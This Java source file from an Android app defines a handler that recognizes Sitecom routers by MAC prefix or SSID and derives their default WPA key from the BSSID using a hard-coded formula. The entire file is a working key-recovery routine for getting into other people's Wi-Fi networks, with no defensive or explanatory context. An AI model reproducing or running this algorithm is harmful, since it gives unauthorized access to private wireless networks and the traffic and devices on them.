package de.warker.ezwlan.handler;

import android.net.wifi.ScanResult;

public class SitecomHandler extends AbstractWlanKeyHandler {
	
	public SitecomHandler() {
		SUPPORTED_MACS.add("00:0C:F6");
		SUPPORTED_SSID.add("Sitecom");
		
	}
	
	private final String lt = "123456789abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ"; // without i,l,o,0

	@Override
	public String getKey(ScanResult sr) {
		String wpakey = "";
		String mac = HandlerFactory.bssid_helper(sr.BSSID).toLowerCase();
		// atol 
		int var_80 = 0;
		String t = "";
		for(int i = 6; i < mac.length(); ++i){
			char c = mac.charAt(i);
			if(c >= '0' && c <= '9'){
				t+=c;
			}
			else{
				if(t.length() > 0){
					var_80 = Integer.parseInt(t);
				}
				break;
			}
		}
		// algo
		wpakey += lt.charAt(((var_80 + mac.charAt(11) + mac.charAt(5)) * (mac.charAt(9) + mac.charAt(3) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(11) + mac.charAt(6)) * (mac.charAt(8) + mac.charAt(10) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(3) + mac.charAt(5)) * (mac.charAt(7) + mac.charAt(9) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(7) + mac.charAt(6)) * (mac.charAt(5) + mac.charAt(4) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(7) + mac.charAt(6)) * (mac.charAt(8) + mac.charAt(9) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(11) + mac.charAt(5)) * (mac.charAt(3) + mac.charAt(4) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(11) + mac.charAt(4)) * (mac.charAt(6) + mac.charAt(8) + mac.charAt(11)))%lt.length());
		wpakey += lt.charAt(((var_80 + mac.charAt(10) + mac.charAt(11)) * (mac.charAt(7) + mac.charAt(8) + mac.charAt(11)))%lt.length());
			    
		return wpakey;
	}

}
